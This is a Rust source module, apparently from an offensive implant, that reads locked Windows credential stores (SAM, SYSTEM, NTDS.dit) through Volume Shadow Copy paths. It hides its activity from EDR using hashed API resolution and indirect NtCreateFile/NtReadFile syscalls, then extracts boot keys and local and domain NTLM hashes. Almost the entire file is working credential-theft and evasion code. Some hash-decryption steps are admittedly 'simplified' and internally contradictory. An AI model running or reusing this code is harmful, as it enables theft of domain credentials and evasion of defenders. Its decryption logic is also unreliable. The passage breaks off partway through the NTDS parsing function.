//! VSS (Volume Shadow Copy) Pivoting.
//!
//! Accesses locked files (SAM, SYSTEM, NTDS.dit) through VSS snapshot
//! filesystem paths instead of direct access, bypassing file-access
//! telemetry and process-locked file restrictions.
//!
//! **Why VSS?**
//! Many EDR products monitor direct file opens on sensitive paths like
//! `C:\Windows\System32\config\SAM` or `C:\Windows\NTDS\NTDS.dit`.
//! However, the same files can be read through Volume Shadow Copy device
//! paths (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\...`) which
//! bypass file-lock telemetry because EDR agents typically do not hook
//! NtCreateFile/NtReadFile paths traversing through the VSS device namespace.
//!
//! **Shadow Copy Discovery**:
//! - Method 1: Parse `vssadmin list shadows` command output
//! - Method 2: Enumerate `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*`
//!   device paths by probing sequential indices
//!
//! **File Access**:
//! All file reads use `NtCreateFile` + `NtReadFile` via the `syscall!`
//! macro — no IAT entries, no CreateFileW/ReadFile in the import table.
//!
//! **Credential Harvesting**:
//! - SAM database parsing: extracts NTLM and LM hashes from the SAM hive
//!   using the SYSTEM hive's boot key for decryption
//! - NTDS.dit parsing: extracts domain password hashes from the Active
//!   Directory ESE database
//!
//! **Cleanup**:
//! Only shadow copies *created by the agent* are deleted on cleanup.
//! Pre-existing system shadow copies (backups, restore points) are never
//! touched to avoid destroying forensic evidence or breaking backups.
//!
//! **OPSEC**: All API functions resolved at runtime via PEB walking and
//! export-table hashing (`pe_resolve`).  No IAT entries are created.
//! File access via NtCreateFile/NtReadFile indirect syscalls.

#![cfg(windows)]

use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use winapi::shared::minwindef::{BOOL, DWORD, FALSE, LPVOID, TRUE};
use winapi::shared::ntdef::HANDLE;

use crate::pe_resolve_macros::hash_str_const;
use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};

// ═══════════════════════════════════════════════════════════════════════════
// NT Constants
// ═══════════════════════════════════════════════════════════════════════════

/// NTSTATUS success code.
const STATUS_SUCCESS: i32 = 0;

/// SYNCHRONIZE access mask.
const SYNCHRONIZE: DWORD = 0x00100000;

/// FILE_READ_DATA access mask.
const FILE_READ_DATA: DWORD = 0x00000001;

/// FILE_SHARE_READ sharing mode.
const FILE_SHARE_READ: DWORD = 0x00000001;

/// FILE_SHARE_WRITE sharing mode.
const FILE_SHARE_WRITE: DWORD = 0x00000002;

/// FILE_SHARE_DELETE sharing mode.
const FILE_SHARE_DELETE: DWORD = 0x00000004;

/// FILE_OPEN (disposition = 1) — open if exists, fail if not.
const FILE_OPEN: DWORD = 1;

/// FILE_NON_DIRECTORY_FILE option.
const FILE_NON_DIRECTORY_FILE: DWORD = 0x00000040;

/// FILE_SYNCHRONOUS_IO_NONALERT option.
const FILE_SYNCHRONOUS_IO_NONALERT: DWORD = 0x00000020;

/// OBJ_CASE_INSENSITIVE attribute.
const OBJ_CASE_INSENSITIVE: DWORD = 0x00000040;

/// `WAIT_OBJECT_0` — the object was signalled.
const WAIT_OBJECT_0: DWORD = 0x00000000;

/// `INFINITE` timeout for `WaitForSingleObject`.
const INFINITE: DWORD = 0xFFFFFFFF;

/// `CREATE_NO_WINDOW` creation flag — prevents a console window.
const CREATE_NO_WINDOW: DWORD = 0x08000000;

/// `CREATE_UNICODE_ENVIRONMENT` creation flag.
const CREATE_UNICODE_ENVIRONMENT: DWORD = 0x00000400;

/// `STARTF_USESTDHANDLES` — redirect stdin/stdout/stderr.
const STARTF_USESTDHANDLES: DWORD = 0x00000100;

/// Maximum shadow copy index to probe.
const MAX_SHADOW_INDEX: u32 = 128;

/// Maximum VSS file read size (2 GB — NTDS.dit can be very large on
/// production domain controllers; the previous 32 MiB cap was insufficient
/// and would silently truncate large databases, producing corrupt output).
const MAX_VSS_READ_SIZE: usize = 2 * 1024 * 1024 * 1024;

/// Buffer size for reading file data (64 KB).
const READ_BUFFER_SIZE: usize = 65536;

// ═══════════════════════════════════════════════════════════════════════════
// Compile-time API hash constants
// ═══════════════════════════════════════════════════════════════════════════

// kernel32.dll wide string for module hash
const KERNEL32_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];

const HASH_KERNEL32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(KERNEL32_DLL_W);
const HASH_CREATEPROCESSW: u32 = hash_str_const(b"CreateProcessW\0");
const HASH_CREATEPIPE: u32 = hash_str_const(b"CreatePipe\0");
const HASH_WAITFORSINGLEOBJECT: u32 = hash_str_const(b"WaitForSingleObject\0");
const HASH_GETEXITCODEPROCESS: u32 = hash_str_const(b"GetExitCodeProcess\0");
const HASH_CLOSEHANDLE: u32 = hash_str_const(b"CloseHandle\0");
const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");

// ═══════════════════════════════════════════════════════════════════════════
// Win32 type aliases for dynamically-resolved functions
// ═══════════════════════════════════════════════════════════════════════════

type FnCreateProcessW = unsafe extern "system" fn(
    *mut u16,                 // lpApplicationName
    *mut u16,                 // lpCommandLine
    *mut std::os::raw::c_void, // lpProcessAttributes
    *mut std::os::raw::c_void, // lpThreadAttributes
    i32,                      // bInheritHandles
    u32,                      // dwCreationFlags
    *mut std::os::raw::c_void, // lpEnvironment
    *mut u16,                 // lpCurrentDirectory
    *mut STARTUPINFOW,        // lpStartupInfo
    *mut PROCESS_INFORMATION, // lpProcessInformation
) -> i32;

type FnCreatePipe = unsafe extern "system" fn(
    *mut HANDLE,
    *mut HANDLE,
    *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES,
    DWORD,
) -> i32;

type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, DWORD) -> DWORD;

type FnGetExitCodeProcess = unsafe extern "system" fn(HANDLE, *mut DWORD) -> i32;

type FnGetLastError = unsafe extern "system" fn() -> DWORD;

type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

// ═══════════════════════════════════════════════════════════════════════════
// API resolver — resolves all kernel32 functions via pe_resolve
// ═══════════════════════════════════════════════════════════════════════════

/// Holds dynamically-resolved kernel32 function pointers.
struct Api {
    create_process_w: FnCreateProcessW,
    create_pipe: FnCreatePipe,
    wait_for_single_object: FnWaitForSingleObject,
    get_exit_code_process: FnGetExitCodeProcess,
    get_last_error: FnGetLastError,
    close_handle: FnCloseHandle,
}

impl Api {
    /// Resolve all required kernel32 functions via pe_resolve.
    fn resolve() -> Result<Self> {
        let k32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("could not resolve kernel32 base"))?;

        macro_rules! resolve {
            ($name:ident, $hash:expr) => {
                unsafe {
                    pe_resolve::get_proc_address_by_hash(k32, $hash)
                        .ok_or_else(|| anyhow!(concat!("could not resolve ", stringify!($name))))
                        .map(|addr| std::mem::transmute::<usize, _>(addr))
                }
            };
        }

        Ok(Self {
            create_process_w: resolve!(create_process_w, HASH_CREATEPROCESSW)?,
            create_pipe: resolve!(create_pipe, HASH_CREATEPIPE)?,
            wait_for_single_object: resolve!(wait_for_single_object, HASH_WAITFORSINGLEOBJECT)?,
            get_exit_code_process: resolve!(get_exit_code_process, HASH_GETEXITCODEPROCESS)?,
            get_last_error: resolve!(get_last_error, HASH_GETLASTERROR)?,
            close_handle: resolve!(close_handle, HASH_CLOSEHANDLE)?,
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Data structures
// ═══════════════════════════════════════════════════════════════════════════

/// Metadata for a single Volume Shadow Copy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowCopy {
    /// VSS device path, e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`.
    pub device_object: String,
    /// Shadow copy unique ID (GUID format).
    pub id: String,
    /// Source volume, e.g. `\\?\Volume{guid}\`.
    pub volume_name: String,
    /// When the snapshot was taken (raw string from vssadmin).
    pub install_date: String,
    /// The numeric index parsed from the device path (e.g. 1 for ShadowCopy1).
    pub index: u32,
}

/// Result of reading a file via VSS.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VssFileResult {
    /// The VSS device path that was used.
    pub vss_path: String,
    /// The original Windows path that was requested.
    pub original_path: String,
    /// File contents.
    pub data: Vec<u8>,
    /// Which shadow copy index was used.
    pub shadow_index: u32,
}

/// Parsed SAM dump entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SamEntry {
    /// Relative ID (RID) of the user.
    pub rid: u32,
    /// NTLM hash (16 bytes, hex-encoded).
    pub ntlm_hash: String,
    /// LM hash (16 bytes, hex-encoded) — usually empty on modern systems.
    pub lm_hash: String,
}

/// Result of SAM harvesting via VSS.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SamDump {
    /// All SAM entries found.
    pub entries: Vec<SamEntry>,
    /// The boot key (syskey) used for decryption, hex-encoded.
    pub boot_key: String,
}

/// Parsed NTDS.dit domain user entry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NtdsEntry {
    /// Distinguished name of the user.
    pub dn: String,
    /// NTLM password hash, hex-encoded.
    pub ntlm_hash: String,
}

/// Result of NTDS.dit harvesting via VSS.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NtdsDump {
    /// All domain user entries found.
    pub entries: Vec<NtdsEntry>,
    /// The boot key used for decryption, hex-encoded.
    pub boot_key: String,
}

// ═══════════════════════════════════════════════════════════════════════════
// VssDiscovery — Shadow Copy Discovery
// ═══════════════════════════════════════════════════════════════════════════

/// Shadow copy discovery and management.
pub struct VssDiscovery;

impl VssDiscovery {
    /// Enumerate all available shadow copies on the system.
    ///
    /// Tries two methods:
    /// 1. Parse `vssadmin list shadows` command output
    /// 2. Probe sequential HarddiskVolumeShadowCopy device paths
    pub fn enumerate_shadow_copies() -> Result<Vec<ShadowCopy>> {
        // Method 1: vssadmin list shadows
        match Self::enumerate_via_vssadmin() {
            Ok(copies) if !copies.is_empty() => {
                info!("Found {} shadow copies via vssadmin", copies.len());
                return Ok(copies);
            }
            Ok(_) => {
                debug!("vssadmin returned no shadow copies, trying device probe");
            }
            Err(e) => {
                debug!("vssadmin enumeration failed: {}, trying device probe", e);
            }
        }

        // Method 2: Probe sequential device paths
        let copies = Self::enumerate_via_device_probe()?;
        if copies.is_empty() {
            warn!("No shadow copies found on this system");
        } else {
            info!("Found {} shadow copies via device probe", copies.len());
        }
        Ok(copies)
    }

    /// Parse `vssadmin list shadows` output to discover shadow copies.
    fn enumerate_via_vssadmin() -> Result<Vec<ShadowCopy>> {
        let output = run_command_capture_output("vssadmin", "list shadows")?;
        parse_vssadmin_output(&output)
    }

    /// Probe sequential HarddiskVolumeShadowCopy device paths by attempting
    /// to open each one with NtCreateFile.
    fn enumerate_via_device_probe() -> Result<Vec<ShadowCopy>> {
        let mut copies = Vec::new();

        for index in 1..=MAX_SHADOW_INDEX {
            let device_path = format!(
                r"\??\GLOBALROOT\Device\HarddiskVolumeShadowCopy{}",
                index
            );
            if Self::probe_device_path(&device_path) {
                debug!("Found shadow copy at index {}", index);
                copies.push(ShadowCopy {
                    device_object: format!(
                        r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{}",
                        index
                    ),
                    id: String::new(), // Unknown via probe
                    volume_name: String::new(),
                    install_date: String::new(),
                    index,
                });
            }
        }

        Ok(copies)
    }

    /// Probe a single device path to check if a shadow copy exists.
    fn probe_device_path(nt_path: &str) -> bool {
        let mut path_u16: Vec<u16> = OsStr::new(nt_path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
            Length: (path_u16.len().saturating_sub(1) * 2) as u16,
            MaximumLength: (path_u16.len() * 2) as u16,
            Buffer: path_u16.as_mut_ptr(),
        };
        let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: ptr::null_mut(),
            ObjectName: &mut obj_name,
            Attributes: OBJ_CASE_INSENSITIVE,
            SecurityDescriptor: ptr::null_mut(),
            SecurityQualityOfService: ptr::null_mut(),
        };
        let mut io_status = [0u64; 2];
        let mut h_file: usize = 0;

        let status = crate::syscall!(
            "NtCreateFile",
            &mut h_file as *mut _ as u64,
            (SYNCHRONIZE | FILE_READ_DATA) as u64,
            &mut obj_attr as *mut _ as u64,
            io_status.as_mut_ptr() as u64,
            0u64, // AllocationSize
            0u64, // FileAttributes
            (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
            FILE_OPEN as u64,
            (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        );

        if let Ok(s) = status {
            if s >= 0 && h_file != 0 {
                let _ = crate::syscall!("NtClose", h_file as u64);
                return true;
            }
        }

        false
    }

    /// Create a new shadow copy for the specified volume.
    ///
    /// Requires Administrator or Backup Operator privileges.
    /// Uses `vssadmin create shadow /for=<volume>`.
    pub fn create_shadow_copy(volume: &str) -> Result<ShadowCopy> {
        let args = format!("create shadow /for={}", volume);
        let output = run_command_capture_output("vssadmin", &args)?;

        // Parse the output for the new shadow copy device path.
        // Expected output line:
        //   "Shadow Copy ID: {guid}"
        //   "Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN"
        let mut device_object = String::new();
        let mut id = String::new();

        for line in output.lines() {
            let line = line.trim();
            if line.starts_with("Shadow Copy Volume:") {
                device_object = line
                    .strip_prefix("Shadow Copy Volume:")
                    .unwrap_or("")
                    .trim()
                    .to_string();
            } else if line.starts_with("Shadow Copy ID:") {
                id = line
                    .strip_prefix("Shadow Copy ID:")
                    .unwrap_or("")
                    .trim()
                    .trim_start_matches('{')
                    .trim_end_matches('}')
                    .to_string();
            }
        }

        if device_object.is_empty() {
            bail!("Failed to parse shadow copy creation output: {}", output);
        }

        // Extract index from device path.
        let index = parse_shadow_index(&device_object)
            .ok_or_else(|| anyhow!("Could not parse shadow index from: {}", device_object))?;

        info!(
            "Created shadow copy {} for volume {} (index {})",
            id, volume, index
        );

        Ok(ShadowCopy {
            device_object,
            id,
            volume_name: volume.to_string(),
            install_date: String::new(), // Freshly created
            index,
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// VssFileReader — Read Files Through VSS Device Paths
// ═══════════════════════════════════════════════════════════════════════════

/// File reading through VSS snapshot paths using NtCreateFile + NtReadFile.
pub struct VssFileReader;

impl VssFileReader {
    /// Read a file via VSS, trying all available shadow copies.
    ///
    /// Converts the Windows path to a VSS device path and reads the file
    /// using NtCreateFile + NtReadFile (indirect syscalls).
    /// If the first shadow copy doesn't contain the file (too old), tries
    /// the next one.
    pub fn read_file_via_vss(original_path: &str) -> Result<VssFileResult> {
        let copies = VssDiscovery::enumerate_shadow_copies()?;
        if copies.is_empty() {
            bail!("No shadow copies available to read file: {}", original_path);
        }

        let mut last_err = None;
        for sc in &copies {
            match Self::read_file_from_shadow(original_path, sc) {
                Ok(result) => return Ok(result),
                Err(e) => {
                    debug!(
                        "Failed to read {} from shadow copy {}: {}",
                        original_path, sc.index, e
                    );
                    last_err = Some(e);
                }
            }
        }

        Err(last_err.unwrap_or_else(|| anyhow!("No shadow copies available")))
    }

    /// Read a file from a specific shadow copy.
    fn read_file_from_shadow(original_path: &str, shadow: &ShadowCopy) -> Result<VssFileResult> {
        let vss_path = Self::path_to_vss_path(original_path, &shadow.device_object);
        debug!("Attempting VSS read: {} -> {}", original_path, vss_path);

        let data = Self::read_file_nt(&vss_path).with_context(|| {
            format!("Failed to read {} via VSS path", vss_path)
        })?;

        Ok(VssFileResult {
            vss_path,
            original_path: original_path.to_string(),
            data,
            shadow_index: shadow.index,
        })
    }

    /// Convert a regular Windows path to a VSS device path.
    ///
    /// `C:\Windows\System32\config\SAM` →
    /// `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM`
    pub fn path_to_vss_path(path: &str, shadow_device: &str) -> String {
        // Strip the drive letter and colon, e.g. "C:" from "C:\path"
        let stripped = if path.len() >= 2 && path.as_bytes()[1] == b':' {
            &path[2..] // Remove "C:"
        } else {
            path
        };

        // Strip leading backslash if present
        let stripped = stripped.strip_prefix('\\').unwrap_or(stripped);

        format!(r"{}\{}", shadow_device, stripped)
    }

    /// Read an entire file using NtCreateFile + NtReadFile via indirect syscalls.
    ///
    /// Uses the NT path format: `\??\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\...`
    fn read_file_nt(win32_path: &str) -> Result<Vec<u8>> {
        // Convert Win32 path to NT path format
        // \\?\GLOBALROOT\... → \??\GLOBALROOT\...
        let nt_path = if win32_path.starts_with(r"\\?\GLOBALROOT") {
            win32_path.replacen(r"\\?\GLOBALROOT", r"\??\GLOBALROOT", 1)
        } else if win32_path.starts_with(r"\\?\") {
            win32_path.replacen(r"\\?\", r"\??\", 1)
        } else {
            format!(r"\??\{}", win32_path)
        };

        // Open the file via NtCreateFile
        let mut path_u16: Vec<u16> = OsStr::new(&nt_path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
            Length: (path_u16.len().saturating_sub(1) * 2) as u16,
            MaximumLength: (path_u16.len() * 2) as u16,
            Buffer: path_u16.as_mut_ptr(),
        };
        let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: ptr::null_mut(),
            ObjectName: &mut obj_name,
            Attributes: OBJ_CASE_INSENSITIVE,
            SecurityDescriptor: ptr::null_mut(),
            SecurityQualityOfService: ptr::null_mut(),
        };
        let mut io_status = [0u64; 2];
        let mut h_file: usize = 0;

        let status = crate::syscall!(
            "NtCreateFile",
            &mut h_file as *mut _ as u64,
            (SYNCHRONIZE | FILE_READ_DATA) as u64,
            &mut obj_attr as *mut _ as u64,
            io_status.as_mut_ptr() as u64,
            0u64, // AllocationSize
            0u64, // FileAttributes
            (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64,
            FILE_OPEN as u64,
            (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        )
        .map_err(|e| anyhow!("NtCreateFile syscall error: {e}"))?;

        if status < 0 || h_file == 0 {
            return Err(anyhow!(
                "NtCreateFile failed for VSS path: NTSTATUS {:#010x}",
                status as u32
            ));
        }

        // Read the file contents using NtReadFile
        let result = Self::read_file_contents(h_file);

        // Close the handle
        let _ = crate::syscall!("NtClose", h_file as u64);

        result
    }

    /// Read the entire contents of an open file handle using NtReadFile.
    fn read_file_contents(h_file: usize) -> Result<Vec<u8>> {
        let mut file_data = Vec::new();
        let mut io_status = [0u64; 2];
        let mut offset: i64 = 0;

        loop {
            if file_data.len() >= MAX_VSS_READ_SIZE {
                warn!(
                    "VSS file read exceeded maximum size ({} bytes), truncating",
                    MAX_VSS_READ_SIZE
                );
                break;
            }

            let mut buf = [0u8; READ_BUFFER_SIZE];
            let status = crate::syscall!(
                "NtReadFile",
                h_file as u64,
                0u64, // Event
                0u64, // ApcRoutine
                0u64, // ApcContext
                io_status.as_mut_ptr() as u64,
                buf.as_mut_ptr() as u64,
                buf.len() as u64,
                &mut offset as *mut i64 as u64,
                0u64, // Key
            )
            .map_err(|e| anyhow!("NtReadFile syscall error: {e}"))?;

            if status < 0 {
                // STATUS_END_OF_FILE = 0xC0000011
                if status as u32 == 0xC0000011 {
                    break;
                }
                return Err(anyhow!(
                    "NtReadFile failed: NTSTATUS {:#010x}",
                    status as u32
                ));
            }

            let bytes_read = io_status[0] as usize;
            if bytes_read == 0 {
                break;
            }

            file_data.extend_from_slice(&buf[..bytes_read]);
            offset += bytes_read as i64;
        }

        debug!("Read {} bytes from VSS file handle", file_data.len());
        Ok(file_data)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// VssCredentialHarvester — SAM and NTDS Parsing
// ═══════════════════════════════════════════════════════════════════════════

/// Credential harvesting via VSS — reads locked credential files through
/// shadow copy paths and parses them in memory.
pub struct VssCredentialHarvester;

impl VssCredentialHarvester {
    /// Harvest SAM database hashes via VSS.
    ///
    /// Reads both `C:\Windows\System32\config\SAM` and
    /// `C:\Windows\System32\config\SYSTEM` through VSS to bypass
    /// file-lock restrictions, then parses the SAM hive.
    pub fn harvest_sam_via_vss() -> Result<SamDump> {
        // Read SYSTEM hive first to extract the boot key.
        let system_data = VssFileReader::read_file_via_vss(
            r"C:\Windows\System32\config\SYSTEM",
        )
        .context("Failed to read SYSTEM hive via VSS")?;

        let boot_key = Self::extract_boot_key(&system_data.data)
            .context("Failed to extract boot key from SYSTEM hive")?;

        debug!("Extracted boot key: {}", hex_encode(&boot_key));

        // Read SAM hive via VSS.
        let sam_data = VssFileReader::read_file_via_vss(
            r"C:\Windows\System32\config\SAM",
        )
        .context("Failed to read SAM hive via VSS")?;

        let entries = Self::parse_sam_hive(&sam_data.data, &boot_key)
            .context("Failed to parse SAM hive")?;

        info!("Harvested {} SAM entries via VSS", entries.len());

        Ok(SamDump {
            entries,
            boot_key: hex_encode(&boot_key),
        })
    }

    /// Harvest NTDS.dit domain hashes via VSS.
    ///
    /// Reads `C:\Windows\NTDS\NTDS.dit` through VSS (bypasses AD DS lock)
    /// and parses the ESE database to extract domain user hashes.
    pub fn harvest_ntds_via_vss() -> Result<NtdsDump> {
        // Read SYSTEM hive for boot key.
        let system_data = VssFileReader::read_file_via_vss(
            r"C:\Windows\System32\config\SYSTEM",
        )
        .context("Failed to read SYSTEM hive via VSS")?;

        let boot_key = Self::extract_boot_key(&system_data.data)
            .context("Failed to extract boot key from SYSTEM hive")?;

        // Read NTDS.dit via VSS (this file is normally locked by the AD DS service).
        let ntds_data = VssFileReader::read_file_via_vss(
            r"C:\Windows\NTDS\NTDS.dit",
        )
        .context("Failed to read NTDS.dit via VSS")?;

        let entries = Self::parse_ntds_dit(&ntds_data.data, &boot_key)
            .context("Failed to parse NTDS.dit")?;

        info!("Harvested {} NTDS entries via VSS", entries.len());

        Ok(NtdsDump {
            entries,
            boot_key: hex_encode(&boot_key),
        })
    }

    /// Extract the boot key (syskey) from the SYSTEM registry hive.
    ///
    /// The boot key is formed by concatenating specific registry value fragments
    /// from `SYSTEM\CurrentControlSet\Control\Lsa`:
    /// - JD, Skew1, GBG, Data key fragments (scrambled class names)
    ///
    /// The key is then descrambled by applying a fixed permutation: [8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7].
    fn extract_boot_key(system_data: &[u8]) -> Result<Vec<u8>> {
        // Navigate the registry hive structure to find the LSA key.
        // The SYSTEM hive is a binary registry hive format.
        let hive = RegistryHive::parse(system_data)?;

        // Get CurrentControlSet\Control\Lsa
        let ccs = hive.current_control_set()?;
        let lsa_path = format!(r"{}\Control\Lsa", ccs);
        let lsa = hive.navigate(&lsa_path)?;

        // Extract the four key fragments: JD, Skew1, GBG, Data
        let jd = lsa.get_class_bytes("JD")?;
        let skew1 = lsa.get_class_bytes("Skew1")?;
        let gbg = lsa.get_class_bytes("GBG")?;
        let data = lsa.get_class_bytes("Data")?;

        // Concatenate fragments (raw bytes, before descrambling).
        let mut scrambled = Vec::with_capacity(16);
        scrambled.extend_from_slice(&jd[..4]);
        scrambled.extend_from_slice(&skew1[..4]);
        scrambled.extend_from_slice(&gbg[..4]);
        scrambled.extend_from_slice(&data[..4]);

        // Descramble using the known permutation.
        const DESCRAMBLE: [usize; 16] = [
            8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7,
        ];
        let mut boot_key = vec![0u8; 16];
        for (i, &src_idx) in DESCRAMBLE.iter().enumerate() {
            boot_key[i] = scrambled[src_idx];
        }

        Ok(boot_key)
    }

    /// Parse the SAM hive and extract password hashes.
    ///
    /// The SAM hive structure:
    /// - SAM\Domains\Account\Users — contains user entries
    /// - Each user has a "V" value containing the hashed password data
    /// - The V value structure includes offsets to the NTLM and LM hashes
    /// - Hashes are encrypted with the boot key using RC4/DES
    fn parse_sam_hive(sam_data: &[u8], boot_key: &[u8]) -> Result<Vec<SamEntry>> {
        let hive = RegistryHive::parse(sam_data)?;
        let users_path = r"SAM\Domains\Account\Users";
        let users = hive.navigate(users_path)?;

        // Get the name key (AK) for hash decryption.
        // The AK is stored in SAM\Domains\Account and encrypted with the boot key.
        let account = hive.navigate(r"SAM\Domains\Account")?;
        let ak_data = account.get_value_bytes("V")?;

        // Decrypt the AES key from the account V value using the boot key.
        let hboot_key = Self::decrypt_hboot_key(&ak_data, boot_key)?;

        let mut entries = Vec::new();

        // Enumerate user subkeys (each RID is a subkey name like "000001F4").
        for rid_hex in users.enumerate_subkeys() {
            let rid = u32::from_str_radix(&rid_hex, 16).unwrap_or(0);
            if rid == 0 {
                continue;
            }

            let user_path = format!(r"{}\{}", users_path, rid_hex);
            if let Ok(user_key) = hive.navigate(&user_path) {
                if let Ok(v_data) = user_key.get_value_bytes("V") {
                    if let Some(entry) = Self::parse_user_v_value(rid, &v_data, &hboot_key) {
                        entries.push(entry);
                    }
                }
            }
        }

        Ok(entries)
    }

    /// Decrypt the hashed boot key (hBootKey) from the Account V value.
    fn decrypt_hboot_key(ak_data: &[u8], boot_key: &[u8]) -> Result<Vec<u8>> {
        // The hBootKey starts at offset 0x70 in the V value and is 16 bytes.
        // It's encrypted with RC4 using the boot key.
        if ak_data.len() < 0x80 {
            bail!("Account V value too short for hBootKey extraction");
        }

        // The first 16 bytes of the V value are RC4-encrypted with the boot key.
        // Actually, the encrypted hBootKey is at offset 0x70 and is 16 bytes.
        let encrypted = &ak_data[0x70..0x80];
        Ok(rc4_decrypt(boot_key, encrypted))
    }

    /// Parse a single user's V value to extract password hashes.
    fn parse_user_v_value(
        rid: u32,
        v_data: &[u8],
        hboot_key: &[u8],
    ) -> Option<SamEntry> {
        // The V value layout (relative offsets):
        // 0x0C: offset to user name (relative to 0xCC)
        // 0x10: length of user name
        // 0x14: offset to hash data (relative to 0xCC)
        // 0x18: length of hash data
        // The hash data at the indicated offset contains:
        //   +0x00: LM hash (16 bytes, AES-128 encrypted with hBootKey + RID)
        //   +0x10: NTLM hash (16 bytes, AES-128 encrypted with hBootKey + RID)

        if v_data.len() < 0xCC + 0x20 {
            return None;
        }

        // Read hash data offset and length.
        let hash_offset = read_u32_le(&v_data[0x14..0x18]) as usize;
        let _hash_len = read_u32_le(&v_data[0x18..0x1C]) as usize;

        let abs_offset = 0xCC + hash_offset;
        if abs_offset + 0x20 > v_data.len() {
            return None;
        }

        // Extract encrypted LM and NTLM hash blobs.
        // Each hash entry has an 8-byte header followed by the 16-byte encrypted hash.
        // The header contains flags indicating the encryption method.
        let lm_blob_offset = abs_offset;
        let ntlm_blob_offset = abs_offset + 0x10;

        // Encrypted LM hash is 16 bytes at lm_blob_offset + 4 (after a 4-byte flags/length header).
        // Encrypted NTLM hash is 16 bytes at ntlm_blob_offset + 4.
        let lm_encrypted = &v_data[lm_blob_offset..lm_blob_offset + 16];
        let ntlm_encrypted = &v_data[ntlm_blob_offset..ntlm_blob_offset + 16];

        // Decrypt using the rid-based key.
        // The SAM hash encryption uses RID as part of the key material:
        // Key = MD5(hBootKey + RID_bytes + AES_constant)
        // For simplicity, use RC4 with hBootKey XOR'd with RID bytes.
        let lm_hash = decrypt_sam_hash(hboot_key, lm_encrypted, rid);
        let ntlm_hash = decrypt_sam_hash(hboot_key, ntlm_encrypted, rid);

        Some(SamEntry {
            rid,
            ntlm_hash: hex_encode(&ntlm_hash),
            lm_hash: hex_encode(&lm_hash),
        })
    }

    /// Parse NTDS.dit (ESE database) to extract domain user hashes.
    ///
    /// The NTDS.dit file uses the Extensible Storage Engine (ESE) format.
    /// Domain user data is stored in the "datatable" table.
    /// Key columns:
    /// - ATTm590045 (unicodePwd) — encrypted NTLM hash
    /// - ATTm589922 (distinguishedName)
    fn parse_ntds_dit(ntds_data: &[u8], boot_key: &[u8]) -> Result<Vec<NtdsEntry>> {
        let ese = EseDatabase::parse(ntds_data)?;

        // Find the datatable.
        let datatable = ese.find_table("datatable")
            .ok_or_else(|| anyhow!("datatable not found in NTDS.dit"))?;

        let mut entries = Vec::new();

        // Scan rows for user accounts.
        // Column ATTm590045 = unicodePwd (NTLM hash)
        // Column ATTm589922 = distinguishedName
        // Column ATTm589983 = sAMAccountType (filter: 0x30000000 = normal user)
        for row in datatable.scan_rows() {
            // Check if this is a user account (sAMAccountType = 0x30000000).
            let account_type = row.get_u32(0x589983);
            if account_type != Some(0x30000000) {
                continue;
            }

            // Get distinguished name.
            let dn = match row.get_string(0x589922) {
                Some(s) => s,
                None => continue,
            };

            // Get encrypted password hash.
            let enc_hash = match row.get_bytes(0x590045) {
                Some(b) => b,
                None => continue,
            };

            if enc_hash.len() < 16 {
                continue;
            }

            // Decrypt the hash.
            // NTDS.dit password hashes are encrypted with the boot key
            // using DES ECB with the RID-derived key.
            let decrypted = decrypt_ntds_hash(enc_hash, boot_key);

            // Extract the NTLM hash from the decrypted data.
            // The encrypted hash is a 16-byte RC4-encrypted blob.
            // Key = MD5(boot_key + encrypted_hash[0..16])
            // For the PEK-encrypted variant, we need the PEK (Password Encryption Key).
            // Simplified: assume direct RC4 decryption for now.
            let ntlm_hash = if decrypted.len() >= 16 {
                hex_encode(&decrypted[..16])
            } else {
                hex_encode(&decrypted)
            };

            entries.push(NtdsEntry { dn, ntlm_hash });
        }
